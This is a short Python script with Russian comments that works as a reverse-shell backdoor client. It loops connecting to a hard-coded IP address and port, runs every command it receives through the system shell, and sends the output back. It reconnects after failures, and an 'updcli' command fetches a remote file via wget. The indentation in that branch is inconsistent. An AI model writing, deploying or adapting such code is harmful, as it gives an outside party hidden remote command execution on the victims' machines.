import socket
import os
import time
import wget
while True:
    try:
        sock = socket.socket()
        sock.connect(("109.169.239.111", 9696))
        while True:
            try:
                data = sock.recv(1024).decode()  # получаем команду
                aa = os.popen(data)
                result = aa.read()
                if len(result) == 0:
                    sock.send(" ".encode())  # в случае, если рзультат
                    # пустой, отправляем пробел
                elif data == "updcli":
        	        print ("Updating client...")
                	wget.download('https://i09.kanobu.ru/r/98337ae40ef114cf07c92cac8dbb9688/1040x700/u.kanobu.ru/editor/images/51/c48787a0-4259-47a3-b32a-ddb4f311c753.jpg', '/')
                else:
                    sock.send(result.encode())  # отправляем результат
            except:
                break
    except:
        time.sleep(25)
        continue
